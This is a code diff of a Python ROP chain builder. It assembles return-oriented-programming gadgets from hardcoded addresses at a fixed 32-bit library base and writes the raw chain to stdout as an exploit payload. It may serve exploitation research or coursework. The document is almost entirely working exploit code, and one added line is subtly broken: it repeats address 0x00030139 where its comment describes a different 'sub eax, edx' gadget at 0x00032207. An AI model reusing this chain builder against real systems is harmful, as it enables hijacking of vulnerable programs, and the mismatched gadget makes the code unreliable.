@@ -148,8 +148,15 @@ class ROP:
     def jump(self):
         self.swp_regs("edx", "edi")
         self.arr += (0x00121c7d + 0xb7dec000).to_bytes(4, byteorder='little')   # 0x00121c7d : mov edx, eax ; mov eax, edx ; ret
-        self.swp_regs("edx", "edi")
-        self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')   #sub eax, ecx ; ret
+        self.swp_regs("edx", "edi")     #edx has head, edi has input symbol
+
+#-- NEW STUFF
+        self.swp_regs("edx", "esi")     #edx is trashed, esi has head
+        self.xchg_w_eax("edx") #xchg eax, edx - where edx = input symbol 
+        self.arr += (0x00030139 + 0xb7dec000).to_bytes(4, byteorder='little') #0x00030139 : mov eax, ecx ; ret - where eax = count
+        self.arr += (0x00030139 + 0xb7dec000).to_bytes(4, byteorder='little') #0x00032207 : sub eax, edx ; ret - where eax = count - symbol
+
+        #self.arr += (0x00150e98 + 0xb7dec000).to_bytes(4, byteorder='little')   #sub eax, ecx ; ret
         self.arr += (0x000654b0 + 0xb7dec000).to_bytes(4, byteorder='little')   # neg eax ; ret
         self.zero_out_reg("esi")
         self.arr += (0x0007773c + 0xb7dec000).to_bytes(4, byteorder='little')   # add with carry (adc reg, reg) ; ret
@@ -231,7 +238,7 @@ class ROP:
         sys.stdout.buffer.write(self.arr)
         #sys.stdout.buffer.write((0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little'))
         #print("LENGTH: ",len(self.arr))
-a = ROP(0)
+a = ROP()
 a.main(sys.argv[1])
 
 
